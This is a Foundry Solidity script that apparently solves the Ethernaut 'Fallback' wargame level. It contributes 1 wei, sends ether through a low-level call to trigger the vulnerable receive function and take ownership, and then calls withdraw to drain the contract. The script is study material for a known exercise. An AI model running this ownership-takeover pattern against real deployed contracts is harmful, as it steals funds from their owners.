//SPDX: License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/Fallback.sol";
import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract FallbackInstance is Script {
   
   //I must send the transaction using "payable" because the fallback function in the "Fallback" smart contract requires, obs: receive().
   Fallback public fallbackInstance = Fallback(payable(0xCAfa09e1533C187B76228b2812f88874CEC9038A));

   function run() external {
    //Starting the broadcast
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    //Calling the contribute function to implement the contributions mapping.
    fallbackInstance.contribute{value: 1 wei}();
    //Triggering the fallback function by making the low level call, sending value but not data.
    address(fallbackInstance).call{value: 1 wei}("");
    console.log("Owner Address: ", fallbackInstance.owner());
    console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
    fallbackInstance.withdraw();
    //Stopping the broadcast
    vm.stopBroadcast();
   }
}